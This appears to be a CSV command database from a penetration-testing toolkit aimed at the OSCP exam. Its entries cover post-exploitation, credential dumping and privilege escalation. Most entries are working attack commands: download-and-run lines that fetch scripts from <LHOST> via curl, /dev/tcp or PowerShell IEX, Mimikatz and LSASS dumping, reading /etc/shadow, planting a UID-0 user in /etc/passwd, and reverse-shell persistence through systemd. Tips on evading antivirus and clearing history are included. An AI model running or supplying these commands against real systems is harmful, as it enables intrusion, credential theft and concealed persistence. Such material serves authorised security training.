"python-m-simplehttpserver-2","Python Simple HTTP Server","post-exploit","python -m SimpleHTTPServer 8000","Start Python 2 HTTP server for file hosting and transfers","data-exfiltration","Auto-generated from full syntax text.

Source:
exfiltration.json","medium"
"curl-url-bash","Curl Url Bash","post-exploit","curl <URL> | bash","Transfer files using curl","data-exfiltration","Auto-generated from full syntax text.

Source:
exfiltration.json","medium"
"wget-url-o","Wget Url O","post-exploit","wget <URL> -O <FILE>","Transfer files using wget","data-exfiltration","Auto-generated from full syntax text.

Source:
exfiltration.json","medium"
"curl-url-o","Curl Url O","post-exploit","curl <URL> -o <FILE>","Transfer files using curl","data-exfiltration","Auto-generated from full syntax text.

Source:
exfiltration.json","medium"
"use-with-i","Use With I","post-exploit","Use with -i for SSH key: scp -i key.pem file target:/path","Transfer files using Use","data-exfiltration","Auto-generated from full syntax text.

Source:
exfiltration.json","low"
"run-directly-lhost","Run Directly Lhost","post-exploit","\\\\<LHOST>\\share\\file.exe","Transfer files using Run","data-exfiltration","Auto-generated from full syntax text.

Source:
exfiltration.json","low"
"socat-tcp-listen","Socat Tcp Listen","post-exploit","socat TCP-LISTEN:port,reuseaddr,fork file:output","Transfer files using socat","data-exfiltration","Auto-generated from full syntax text.

Source:
exfiltration.json","low"
"whoami-all","Windows User Enumeration (Full)","post-exploit","whoami /all","Display complete user identity including groups, privileges, and SID","enumeration","Auto-generated from full syntax text.

Source:
windows.json","medium"
"import-powerup-2","Import Powerup 2","post-exploit","PowerUp.ps1 Invoke-AllChecks","Enumerate system information using PowerUp.ps1","enumeration","Auto-generated from full syntax text.

Source:
windows.json","low"
"sc-sdshow-service","Sc Sdshow Service","post-exploit","sc sdshow <service>","Execute sc for post-exploitation","general","Auto-generated from full syntax text.

Source:
windows.json","low"
"dir-s-b","Dir S B","post-exploit","dir /s /b C:\*.dll 2>nul","Execute dir for post-exploitation","general","Auto-generated from full syntax text.

Source:
windows.json","low"
"cat-etc-sudoers","Cat Etc Sudoers","post-exploit","cat /etc/sudoers","Privilege escalation technique via cat","privilege-escalation","Auto-generated from full syntax text.

Source:
linux-sudo-commands.json","high"
"ls-la-root","Ls La Root","post-exploit","ls -la /root/","Execute ls for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux-sudo-commands.json","low"
"cat-etc-shadow","Cat Etc Shadow","post-exploit","cat /etc/shadow","Attempt to read /etc/shadow file to extract password hashes","credential-dumping","Auto-generated from full syntax text.

Source:
linux-sudo-commands.json","high"
"ls-la-root-2","Ls La Root 2","post-exploit","ls -la /root/","Execute ls for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux-suid-basic-commands.json","low"
"cat-etc-shadow-2","Cat Etc Shadow 2","post-exploit","cat /etc/shadow","Attempt to read /etc/shadow file to extract password hashes","credential-dumping","Auto-generated from full syntax text.

Source:
linux-suid-basic-commands.json","high"
"find-path-name","Find Path Name","post-exploit","find <PATH> -name '*.php' -exec grep -i password {} +","Discover or extract credentials from target system","credential-dumping","Auto-generated from full syntax text.

Source:
credential-discovery.json","low"
"find-path-name-2","Find Path Name 2","post-exploit","find <PATH> -name 'config*' -exec cat {} +","Discover or extract credentials from target system","credential-dumping","Auto-generated from full syntax text.

Source:
credential-discovery.json","low"
"getent-passwd-grep","Getent Passwd Grep","post-exploit","getent passwd | grep -v nologin | cut -d: -f1","Discover or extract credentials from target system","credential-dumping","Auto-generated from full syntax text.

Source:
credential-discovery.json","low"
"grep-r-etc","Grep R Etc","post-exploit","grep -r '/etc/cron' /etc/","Enumerate system information using grep","enumeration","Auto-generated from full syntax text.

Source:
linux.json","high"
"echo-newroot-salt","Echo Newroot Salt","post-exploit","echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd","Discover or extract credentials from target system","credential-dumping","Auto-generated from full syntax text.

Source:
linux.json","high"
"cat-proc-version","Cat Proc Version","post-exploit","cat /proc/version","Enumerate system information using cat","enumeration","Auto-generated from full syntax text.

Source:
linux.json","medium"
"nmap-script-nfs","Nmap Script Nfs","post-exploit","nmap --script nfs-showmount","Enumerate system information using nmap","enumeration","Auto-generated from full syntax text.

Source:
linux.json","medium"
"docker-run-v","Docker Run V","post-exploit","docker run -v /:/hostfs -it ubuntu bash","Privilege escalation technique via docker","privilege-escalation","Auto-generated from full syntax text.

Source:
linux.json","high"
"find-name-authorized","Find Name Authorized","post-exploit","find / -name authorized_keys","Locate SSH authorized_keys files for credential discovery and persistence","credential-dumping","Auto-generated from full syntax text.

Source:
linux.json","high"
"grep-r-private","Grep R Private","post-exploit","grep -r 'PRIVATE KEY' /home 2>/dev/null","Discover or extract credentials from target system","credential-dumping","Auto-generated from full syntax text.

Source:
linux.json","high"
"cat-etc-sudoers-2","Cat Etc Sudoers 2","post-exploit","cat /etc/sudoers 2>/dev/null","Privilege escalation technique via cat","privilege-escalation","Auto-generated from full syntax text.

Source:
linux.json","high"
"cat-etc-os","Cat Etc Os","post-exploit","cat /etc/os-release","Execute cat for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux.json","low"
"wget-o-https","Wget O Https","post-exploit","wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh","Download and execute LinPEAS privilege escalation enumeration script","data-exfiltration","Auto-generated from full syntax text.

Source:
linux.json","high"
"watch-n-ps","Watch N Ps","post-exploit","watch -n 1 'ps aux | grep -v grep'","Enumerate system information using watch","enumeration","Auto-generated from full syntax text.

Source:
linux.json","low"
"showmount-e-localhost","Showmount E Localhost","post-exploit","showmount -e localhost","Execute showmount for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux.json","low"
"ls-la-bin","Ls La Bin","post-exploit","ls -la /bin/systemctl","Privilege escalation technique via ls","privilege-escalation","Auto-generated from full syntax text.

Source:
linux.json","high"
"getcap-bin-systemctl","Getcap Bin Systemctl","post-exploit","getcap /bin/systemctl","Display Linux capabilities assigned to binary for privilege escalation identification","privilege-escalation","Auto-generated from full syntax text.

Source:
linux.json","high"
"find-etc-name","Find Etc Name","post-exploit","find /etc -name '*.sh' -exec grep '\*' {} \;","Execute find for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux.json","low"
"test-shadow-file","Test Shadow File","post-exploit","Test shadow file read: cat /etc/shadow 2>/dev/null | grep root","Attempt to read /etc/shadow file to extract password hashes","credential-dumping","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high"
"test-sudo-without","Test Sudo Without","post-exploit","sudo -l  # Test sudo without requiring password entry","List sudo privileges for current user without password prompt","privilege-escalation","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high"
"edit-etc-shadow","Edit Etc Shadow","post-exploit","Edit /etc/shadow instead if cap allows: remove root password hash","Discover or extract credentials from target system","credential-dumping","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high"
"use-cp-command","Use Cp Command","post-exploit","cp modified_passwd /etc/passwd","Execute Use for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high"
"use-tar-to","Use Tar To","post-exploit","tar -xzf passwd.tar.gz -C /","Execute Use for post-exploitation","general","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","low"
"bash-dev-tcp-download","Bash /dev/tcp Download","post-exploit","exec 3<>/dev/tcp/<LHOST>/<PORT>; cat <&3 > <FILE>; exec 3<&-","Download file using Bash built-in /dev/tcp when curl/wget unavailable","data-exfiltration","Auto-generated supplemental command.

Requires Bash compiled with network support.

Alternative to curl/wget.","high"
"curl-insecure-ssl","Curl Insecure SSL Download","post-exploit","curl -k <URL> -o <FILE>","Download file ignoring SSL certificate validation errors","data-exfiltration","Auto-generated supplemental command.

Use when target has self-signed certificates.","medium"
"base64-file-transfer","Base64 File Transfer","post-exploit","base64 -w 0 <FILE>","Encode file to base64 for text-safe transfer via copy-paste or terminal","data-exfiltration","Auto-generated supplemental command.

Decode on target with:
base64 -d > file","high"
"base64-decode-file","Base64 Decode File","post-exploit","echo '<BASE64_STRING>' | base64 -d > <FILE>","Decode base64 string to binary file","data-exfiltration","Auto-generated supplemental command.

Companion to base64 encoding.","high"
"invoke-watson","Invoke-Watson Windows Vulnerability Scanner","post-exploit","powershell.exe -exec bypass -C ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/<PATH>/Watson.ps1'); Invoke-Watson""","Download and execute Watson PowerShell script to enumerate missing Windows patches and exploitable vulnerabilities","enumeration","Auto-generated supplemental command.

Watson identifies CVEs and missing KB patches.

Alternative Techniques:
- sherlock.ps1","high"
"check-sudoers-readable","Check Sudoers File Readability","post-exploit","test -r /etc/sudoers && cat /etc/sudoers || echo 'Not readable'","Test if /etc/sudoers is readable and display contents if accessible","enumeration","Auto-generated supplemental command.

Sudoers normally requires root access.","medium"
"find-suid-usr-bin","Find SUID Binaries in /usr/bin","post-exploit","find /usr/bin /usr/sbin -type f -perm -4000 -ls 2>/dev/null","Manually search /usr/bin and /usr/sbin for SUID binaries","privilege-escalation","Auto-generated supplemental command.

Focused search in common system binary directories.","high"
"searchsploit-linux-capability","SearchSploit Linux Capability Exploits","post-exploit","searchsploit linux capability | grep -i <CAPABILITY>","Search exploit-db for Linux capability-based privilege escalation techniques","privilege-escalation","Auto-generated supplemental command.

Search after identifying capabilities with getcap.","high"
"gtfobins-capability-lookup","GTFOBins Capability Technique Lookup","post-exploit","curl -s https://gtfobins.github.io/ | grep -A 20 '<BINARY>'","Query GTFOBins for alternative exploitation techniques for capability-enabled binary","privilege-escalation","Auto-generated supplemental command.

GTFOBins provides capability-based exploitation methods.

Offline version recommended for exam.","high"
"capability-binary-verification","Verify Capability on Binary","post-exploit","getcap <BINARY_PATH> && ls -la <BINARY_PATH>","Verify identified capability and binary combination from previous enumeration steps","enumeration","Auto-generated supplemental command.

Verification step before exploitation.","medium"
"powershell-wget-alias","PowerShell wget Alias Download","post-exploit","powershell.exe wget <URL> -OutFile <FILE>","Download file using PowerShell wget alias (wrapper for Invoke-WebRequest)","data-exfiltration","Auto-generated supplemental command.

wget is PowerShell alias for Invoke-WebRequest.","medium"
"linux-cred-discover-config","Discover Credentials in Config Files","post-exploit","grep -r -i -E '(password|passwd|pwd|dbpass)' <SEARCH_PATH> 2>/dev/null","Search recursively for password strings in configuration files (PHP, config, env, etc.)","credential-access","Common config file locations:
/var/www/html/config.php, /var/www/html/wp-config.php, /etc/*.conf, .env files.

Time estimate:
1-2 minutes.

OSCP tip:
Database credentials often reused for SSH.

Look for patterns:
password=, DB_PASS, dbpass, credentials, auth.

Check .git/config for credentials in URLs.","high"
"linux-enum-users-shells","Enumerate Users with Login Shells","post-exploit","cat /etc/passwd | grep -v 'nologin\|false' | cut -d: -f1","Extract valid usernames from /etc/passwd that have real login shells (exclude service accounts)","enumeration","Valid login shells typically:
/bin/bash, /bin/sh, /bin/zsh.

Service accounts use /usr/sbin/nologin or /bin/false.

Time estimate:
10 seconds.

OSCP tip:
Test discovered credentials against these users via SSH.

Common OSCP usernames:
user, admin, root, www-data (if shell granted).

Also check:
/home directories for personal data, .ssh/authorized_keys.","high"
"windows-hashcat-crack-ntlm","Crack NTLM Hash with Hashcat (Single Hash)","post-exploit","hashcat -m 1000 -a 0 <HASH_FILE> /usr/share/wordlists/rockyou.txt --force","Crack single NTLM password hash using dictionary attack with rockyou.txt wordlist. Mode 1000 is for NTLM hashes (32 hex characters). Use --force flag in VMs to bypass GPU checks. Hash cracks in seconds to hours depending on password complexity.","password-cracking","Hashcat is ESSENTIAL for OSCP but NOT required for Windows authentication. CRITICAL MINDSET: Use hash immediately for Pass-the-Hash while cracking runs in background. WORKFLOW: (1) Extract hash, (2) Start Hashcat in background: hashcat -m 1000 hash.txt rockyou.txt --force & disown, (3) Use hash with psexec/wmiexec NOW (don't wait), (4) Check progress later: hashcat -m 1000 hash.txt --show. Password cracking is for: (1) RDP access (requires plaintext), (2) Web apps (require plaintext), (3) Credential reuse (test plaintext on other systems), (4) Reporting (demonstrate weak passwords).

COMPLEXITY VS TIME:
- Weak (Password1, Welcome123): <1 minute with rockyou.txt
- Medium (P@ssw0rd!, Spring2024!): 1-30 minutes with rules (best64.rule)
- Strong (RandomPass123!@#): Hours to days (try combinator attack or larger wordlists)
- Very Strong (20+ random chars): UNCRACKABLE - use Pass-the-Hash instead

BACKGROUND EXECUTION:
bash -c 'hashcat -m 1000 hash.txt rockyou.txt --force > /tmp/hashcat.log 2>&1 & disown'
Monitor: tail -f /tmp/hashcat.log
Check status: hashcat -m 1000 hash.txt --show (lists cracked hashes)

RULES FOR BETTER SUCCESS:
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
best64.rule: 64 common variations (uppercase, append numbers, leet speak)
dive.rule: 99,092 rules (comprehensive, slower)
OSCP-specific: Create custom rule for seasonal passwords (Spring2024, Fall2023)

MULTIPLE HASHES:
cat << EOF > hashes.txt
08d7a47a6f9f66b97b1bae4178747494
2892d26cdf84d7a70e2eb3b9f05c425e
1693c6cefafffc7af11ef34d1c788f47
EOF
hashcat -m 1000 hashes.txt rockyou.txt --force --show (displays all cracked)

TIME ESTIMATE: 10 seconds - 24 hours depending on password complexity. Weak passwords (<10 chars, dictionary words) crack in minutes.","high"
"windows-hashcat-crack-ntlm-file","Crack Multiple NTLM Hashes from File (Batch)","post-exploit","hashcat -m 1000 -a 0 <HASH_FILE> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Crack multiple NTLM hashes from file using dictionary attack with word mangling rules. Rules modify wordlist entries (uppercase, append numbers, leet speak) for higher crack rate. Ideal for batch processing domain hashes after DCSync full dump.","password-cracking","Use this for BATCH cracking after full DCSync domain dump (ad-dcsync-secretsdump-all). TYPICAL OSCP SCENARIO: (1) Achieve Domain Admin, (2) DCSync entire domain (may be 50-500 users), (3) Extract NTLM hashes to file, (4) Start Hashcat in background with rules, (5) Continue exam while cracking runs, (6) Check back periodically for newly cracked credentials.

EXPECTED CRACK RATES (with best64.rule):
- rockyou.txt alone: 30-40% of corporate passwords
- rockyou.txt + best64.rule: 60-75% of corporate passwords
- rockyou.txt + dive.rule: 70-85% (but takes 10-20x longer)
- Custom wordlist (company name, locations): +10-15% additional cracks

BACKGROUND EXECUTION BEST PRACTICE:
bash -c 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --status --status-timer=300 > /tmp/hashcat_$(date +%s).log 2>&1 & disown'

MONITORING:
# View cracked so far:
hashcat -m 1000 hashes.txt --show | wc -l

# View cracked passwords:
hashcat -m 1000 hashes.txt --show

# View cracked with usernames (if you kept mapping file):
while IFS=: read hash user; do 
  cracked=$(hashcat -m 1000 hashes.txt --show 2>/dev/null | grep ""^$hash:"" | cut -d: -f2)
  [ -n ""$cracked"" ] && echo ""$user:$cracked""
done < user_hash_map.txt

CREATING USER-TO-HASH MAPPING:
# During hash extraction, preserve usernames:
impacket-secretsdump 'domain/user:pass@dc' -just-dc > full_dump.txt
grep ':' full_dump.txt | awk -F: '{print $4 "":"" $1}' > user_hash_map.txt
# Format: NTLM_HASH:USERNAME
# Use for reporting: correlate cracked passwords back to usernames

RULE SELECTION GUIDANCE:
- OSCP Exam (time limited): best64.rule (fast, good results)
- Lab Practice: dive.rule OR d3ad0ne.rule (comprehensive)
- Corporate Pentest: OneRuleToRuleThemAll.rule (balanced)
- Custom: Create rule for seasonal passwords (Spring2024!, Fall2023!)

CUSTOM RULE EXAMPLE (save as oscp.rule):
:
c
u
l ^0 $1
$1 $2 $3
$! $@
# Explanation: Try original, capitalize, uppercase, lowercase, prepend 0 append 1, append 123, append !@
# Use: hashcat -m 1000 hash.txt rockyou.txt -r oscp.rule

TIME ESTIMATES:
- rockyou.txt alone: 2-10 minutes (14M passwords × hash speed)
- rockyou.txt + best64.rule: 10-60 minutes (14M × 64 rules = 896M candidates)
- rockyou.txt + dive.rule: 2-10 hours (14M × 99K rules = 1.4 trillion candidates)
- Depends on hardware: CPU (1-10M hash/sec), GPU (100M-10B hash/sec)

OSCP EXAM STRATEGY:
1. Start cracking immediately after DCSync: hashcat ... & disown
2. Continue with other exam objectives (don't wait)
3. Check status every hour: hashcat --show | wc -l
4. Use cracked credentials for NEW lateral movement paths
5. Document all cracked passwords in post_exploitation.md
6. If exam time running low, accept uncracked hashes and use PTH instead","high"
"windows-rdp-xfreerdp","RDP Connection with xfreerdp (GUI Access)","lateral-movement","xfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution","Connect to Windows system via Remote Desktop Protocol (RDP) for full GUI access. Requires plaintext password (cracked from hash) or RDP-compatible credentials. Useful for GUI-only tools, file browsing, screenshot capture, and interactive exploitation.","remote-access","RDP is USEFUL but NOT REQUIRED for OSCP. Command-line tools (psexec, wmiexec) are often more efficient. USE RDP WHEN: (1) GUI-only tool needed (GUI exploit, graphical config tool), (2) File browsing is easier visually (searching desktop, documents), (3) Screenshot needed for proof (exam flag documentation), (4) Interactive debugging required.

DISADVANTAGES OF RDP:
- Requires plaintext password (must crack NTLM hash first - takes time)
- Generates Event ID 4624 Type 10 (RemoteInteractive) - HIGHLY monitored
- Creates visible session on target (other users see login notification)
- Slower than command-line (GUI rendering overhead)
- May disconnect other RDP sessions (default limit: 2 concurrent sessions)

ADVANTAGES OF RDP:
- Full GUI access (run any application)
- Clipboard sharing (copy/paste files, text between Kali and Windows)
- Drive redirection (mount Kali filesystem in Windows: /drive:/tmp,/tmp)
- Screenshot capture (proof for OSCP report)
- Easier for complex tasks (browsing registry, file system)

OSCP EXAM WORKFLOW:
1. Obtain NTLM hash via DCSync or SAM dump
2. Start Hashcat in background: hashcat -m 1000 hash.txt rockyou.txt & disown
3. Meanwhile, use hash for Pass-the-Hash (psexec, wmiexec)
4. When password cracks, connect via RDP for GUI tasks
5. Take screenshot of flag (OSCP proof requirement)
6. Dump LSASS, search for sensitive files
7. Disconnect and continue with command-line tools

DRIVE REDIRECTION (File Transfer):
xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET> /cert-ignore /dynamic-resolution /drive:/tmp,/tmp
# This mounts /tmp from Kali as \\tsclient\tmp in Windows
# Transfer files: copy C:\sensitive.txt \\tsclient\tmp\
# Or: copy \\tsclient\tmp\mimikatz.exe C:\Users\Public\

CLIPBOARD SHARING (Default Enabled):
# Copy text from Kali terminal, paste in Windows RDP session
# Copy file path in Windows, paste in Kali terminal
# Useful for long file paths, command output, etc.

SCREENSHOT CAPTURE (OSCP Proof):
1. Connect via RDP
2. Open flag file: type C:\Users\Administrator\Desktop\proof.txt
3. Take screenshot: scrot -s /tmp/proof_screenshot.png (on Kali, select RDP window)
4. Or use Windows Snipping Tool, save to \\tsclient\tmp
5. Include in OSCP report as proof of Administrator access

ALTERNATIVE RDP CLIENTS:
- rdesktop: Older, simpler. Usage: rdesktop -u <USER> -p <PASS> -d <DOMAIN> <TARGET>
- Remmina: GUI-based. Better for persistent connections, multiple sessions
- Windows RDP (mstsc.exe via Wine): Not recommended, use native Linux tools

COMMON MISTAKES:
- Forgetting /cert-ignore (connection fails silently)
- Using NTLM hash instead of plaintext password (RDP doesn't support PTH)
- Not specifying domain (/d flag) for domain accounts (authentication fails)
- Connecting to DC via RDP during exam (generates alerts, use command-line instead)
- Not using drive redirection for file transfer (manual SMB setup more complex)

SECURITY CONSIDERATIONS:
- Password visible in bash history (use history -c to clear after exam)
- Password visible in process list (ps aux shows command with /p flag)
- RDP session logged on target (Event ID 4624 Type 10, 4634 on logoff)
- Connection generates network traffic (RDP handshake, encryption negotiation)
- For stealth, use command-line tools (psexec, wmiexec) instead

TIME ESTIMATE: 5-15 seconds for connection, <1 second for subsequent reconnections","medium"
"linux-privesc-linpeas","LinPEAS - Automated Enumeration","post-exploit","curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh","Comprehensive automated privilege escalation enumeration for Linux","linux","Save output to file for later analysis:
linpeas.sh | tee linpeas.out","high"
"linux-privesc-linenum","LinEnum - Basic Enumeration","post-exploit","wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh","Basic Linux enumeration script for privilege escalation","linux","Lighter weight than LinPEAS, good for restricted environments","high"
"linux-suid-find","Find SUID Binaries","post-exploit","find / -perm -u=s -type f 2>/dev/null","Manually find all SUID binaries (may lead to privilege escalation)","linux","Cross-reference findings with https://gtfobins.github.io/","high"
"linux-sudo-list","Check Sudo Permissions","post-exploit","sudo -l","List commands current user can run with sudo","linux","NOPASSWD is a major win - can escalate without password","high"
"linux-cron-enum","Enumerate Cron Jobs","post-exploit","cat /etc/crontab && ls -la /etc/cron.* && crontab -l","Check for scheduled tasks that may be exploitable","linux","Pay attention to scripts run by root with writable paths","high"
"linux-writable-etc-passwd","Check Writable /etc/passwd","post-exploit","ls -l /etc/passwd && echo 'test' >> /etc/passwd 2>/dev/null && echo 'Writable!' || echo 'Not writable'","Test if /etc/passwd is writable (instant root if true)","linux","If writable:
openssl passwd -1 password123, then add user with UID 0","high"
"linux-capabilities","Enumerate File Capabilities","post-exploit","getcap -r / 2>/dev/null","Find files with special capabilities that may allow privilege escalation","linux","cap_setuid+ep on python/perl/ruby = easy root shell","medium"
"linux-kernel-exploit","Check Kernel Version for Exploits","post-exploit","uname -a && cat /etc/issue","Identify kernel version to search for known exploits","linux","Kernel exploits are risky - test in safe environment first","medium"
"linux-writable-services","Find Writable Service Files","post-exploit","find /etc/systemd/system -writable -type f 2>/dev/null","Locate systemd service files that are writable (can modify to escalate)","linux","Modify ExecStart to run reverse shell as root","medium"
"linux-nfs-no-root-squash","Check NFS for no_root_squash","post-exploit","cat /etc/exports && showmount -e <TARGET>","Find NFS shares with no_root_squash (allows mounting as root)","linux","Mount with: mount -o rw <TARGET>:/share /mnt/nfs","medium"
"linux-docker-escape","Check Docker Group Membership","post-exploit","id && groups && docker ps 2>/dev/null","Check if user is in docker group (allows easy root escalation)","linux","Docker group = root equivalent - instant privilege escalation","high"
"linux-ld-preload","LD_PRELOAD Privilege Escalation","post-exploit","sudo -l | grep LD_PRELOAD","Check if LD_PRELOAD is allowed in sudo environment","linux","Requires C code:
void _init() { setuid(0); system('/bin/bash'); }","medium"
"linux-path-hijack","PATH Hijacking","post-exploit","echo $PATH && find / -perm -u=s -type f 2>/dev/null | xargs strings | grep -i 'path'","Find SUID binaries vulnerable to PATH hijacking","linux","Example:
if SUID calls 'ls', create /tmp/ls with shell, add /tmp to PATH","high"
"linux-ssh-keys","Search for SSH Private Keys","post-exploit","find / -name id_rsa 2>/dev/null && find / -name id_dsa 2>/dev/null","Find SSH private keys that may allow lateral movement or escalation","linux","Also check .ssh/authorized_keys for adding your own key","medium"
"linux-mysql-udf","MySQL User Defined Function Exploit","post-exploit","mysql -u root -p<PASSWORD> -e 'SELECT * FROM mysql.func;'","Check MySQL for UDF privilege escalation opportunity","linux","Requires MySQL running as root or with file write permissions","low"
"linux-sudo-check","Check Sudo Privileges","post-exploit","sudo -l","List allowed sudo commands for current user","linux","NOPASSWD entries are quick wins","high"
"linux-cron-jobs","Enumerate Cron Jobs","post-exploit","cat /etc/crontab && ls -la /etc/cron.*","Check system cron jobs for privilege escalation","linux","Check for PATH manipulation opportunities","high"
"linux-writable-passwd","Check /etc/passwd Permissions","post-exploit","ls -la /etc/passwd && ls -la /etc/shadow","Check if passwd/shadow files are writable","linux","Writable /etc/passwd is instant root","high"
"linux-kernel-version","Check Kernel Version","post-exploit","uname -a && cat /proc/version","Identify kernel version for exploit research","linux","Match exact kernel version for reliability","high"
"linux-linpeas","Run LinPEAS Enumeration","post-exploit","curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh","Comprehensive Linux privilege escalation enumeration","linux","Can be noisy, use -q for quiet mode","high"
"linux-pspy","Monitor Processes with pspy","post-exploit","./pspy64 -pf -i 1000","Monitor running processes without root","linux","Download from:
https://github.com/DominicBreuker/pspy","medium"
"linux-mysql-root","MySQL Running as Root","post-exploit","ps aux | grep mysql && mysql -u root","Check if MySQL is running as root with no password","linux","UDF library needed for command execution","medium"
"linux-nfs-root-squash","NFS Root Squashing Check","post-exploit","cat /etc/exports | grep no_root_squash","Check for misconfigured NFS exports","linux","Requires NFS client on attacker machine","high"
"linux-systemctl-privesc","Systemctl SUID Exploitation","post-exploit","find / -name systemctl -perm -4000 2>/dev/null","Check if systemctl has SUID bit","linux","Works on misconfigured systems","high"
"linux-wildcard-injection","Wildcard Injection in Scripts","post-exploit","grep -r '\*' /etc/cron* /var/spool/cron* 2>/dev/null","Find scripts using wildcards in cron","linux","Common in backup scripts","high"
"linux-unix-privesc-check-nc","unix-privesc-check via Netcat","post-exploit","cat < /dev/tcp/<LHOST>/<PORT> | sh -s -- standard","Execute unix-privesc-check via netcat without curl (simpler alternative to LinPEAS)","linux","Prerequisites:
sudo nc -q 5 -lvnp <PORT> < /path/to/unix-privesc-check.

Simpler output than LinPEAS, good for quick verification.

~1-2 minute execution time.","high"
"linux-find-world-writable","Find World-Writable Files","post-exploit","find / -type f -perm -002 -ls 2>/dev/null","Find all world-writable files (files that should NOT be writable by everyone)","linux","World-writable /etc/passwd = instant root.

Use:
openssl passwd -1 password123, then echo 'hacker:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd","high"
"linux-find-writable-etc-focused","Find World-Writable Files in /etc","post-exploit","find /etc -type f -perm -002 -ls 2>/dev/null","Find world-writable files in /etc (critical configuration directory)","linux","Faster than system-wide search.

Common OSCP scenario.

~10 seconds to run.","high"
"linux-linpeas-http","LinPEAS via HTTP Server","post-exploit","curl <LHOST>:<PORT>/linpeas.sh | sh","Execute LinPEAS via local HTTP server (most reliable transfer method)","linux","Prerequisites:
sudo python3 -m http.server <PORT> (in directory with linpeas.sh).

Most reliable method for OSCP.

~3-5 minute execution.","high"
"linux-linpeas-nc","LinPEAS via Netcat","post-exploit","cat < /dev/tcp/<LHOST>/<PORT> | sh","Execute LinPEAS via netcat (no curl/wget required on victim)","linux","Prerequisites:
sudo nc -q 5 -lvnp <PORT> < linpeas.sh.

Use when curl/wget unavailable.

Requires bash with /dev/tcp support.","high"
"linux-linpeas-save-output","LinPEAS Save Output to File","post-exploit","curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh > <OUTPUT_FILE>","Run LinPEAS and save output to file for analysis (RAM-based recommended)","linux","/dev/shm is RAM-based, files deleted on reboot.

Good for stealth.

Use 'less -r' to view with colors.","high"
"linux-test-file-writable","Test if File is Writable","post-exploit","test -w <FILE> && echo 'Writable!' || echo 'Not writable'","Quick test if specific file is writable by current user","linux","Common files to test:
/etc/passwd, /etc/shadow, /etc/sudoers, /root/.ssh/authorized_keys, service files in /etc/systemd/system","high"
"linux-check-shadow-readable","Check if /etc/shadow is Readable","post-exploit","test -r /etc/shadow && echo 'Shadow is readable!' || echo 'Shadow not readable'","Check if /etc/shadow is readable (should be root-only, contains password hashes)","linux","Readable /etc/shadow is major finding.

Extract and crack offline with john or hashcat.

Normal permissions:
-rw-r----- (640) owned by root:shadow","high"
"linux-parse-linpeas-writable","Parse LinPEAS Output for World-Writable Files","post-exploit","grep -i 'world.*writable\|writable.*world' <OUTPUT_FILE>","Extract world-writable file findings from saved LinPEAS output","linux","Combine with other searches:
grep -iE 'world|writable|suid|sudo|password' <OUTPUT_FILE> | less","high"
"linux-find-writable-services-systemd","Find Writable Systemd Service Files","post-exploit","find /etc/systemd/system -writable -type f 2>/dev/null","Find systemd service files writable by current user (can modify to run commands as root)","linux","Check if service runs as root before modifying.

Can also add [Install] WantedBy=multi-user.target for persistence.","medium"
"invoke-mimikatz-remote","Remote Mimikatz Credential Dump","post-exploit","Invoke-Command -ComputerName <TARGET> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<MIMIKATZ_SCRIPT>'); Invoke-Mimikatz -Command '""privilege::debug"" ""sekurlsa::logonpasswords""' }","Execute Mimikatz remotely via PowerShell remoting.
Dump credentials from LSASS memory without uploading files.","","Fileless credential dumping via PowerShell remoting.

Advantages:
(1) No disk writes (bypasses some AV), (2) Remote execution (don't need interactive access), (3) Returns credentials to your console.

Prerequisites:
(1) Local admin on target, (2) WinRM enabled (Test-WSMan), (3) Web server hosting Invoke-Mimikatz.ps1.

Modern Windows (10+/2016+) has WDigest disabled by default (no plaintext passwords) - you'll get NTLM hashes only.

Use pass-the-hash with these hashes.

Target logged-on users:
Domain Admins, service accounts, other privileged accounts.

OSCP:
After finding admin sessions via Get-NetSession/Get-NetLoggedon, use this to dump those credentials remotely.

Operational security:
Mimikatz is LOUD (triggers AV/EDR) - use only when necessary.

Alternative:
procdump + pypykatz (stealthier).","high"
"procdump-lsass","Dump LSASS Memory with ProcDump","post-exploit","procdump.exe -accepteula -ma lsass.exe <OUTPUT_FILE>","Create memory dump of LSASS process using Sysinternals ProcDump.
Dump can be parsed offline with pypykatz or Mimikatz.","","Stealthier alternative to Mimikatz - ProcDump is a legitimate Microsoft Sysinternals tool (less likely to trigger AV).

Workflow:
(1) Upload procdump.exe to target (copy procdump.exe \\<TARGET>\C$\Temp\), (2) Execute via PsExec/WMI, (3) Download dump file, (4) Parse offline on Kali.

LSASS (Local Security Authority Subsystem Service) stores credentials in memory for SSO.

Dump contains:
NTLM hashes, Kerberos tickets (TGT/TGS), plaintext passwords (if WDigest enabled), cached domain credentials.

Parsing tools:
pypykatz (Python, Kali), Mimikatz (Windows), secretsdump.py (Impacket).

OSCP:
Preferred method when Mimikatz is blocked - procdump + pypykatz is quieter.

Download ProcDump:
https://live.sysinternals.com/procdump.exe","high"
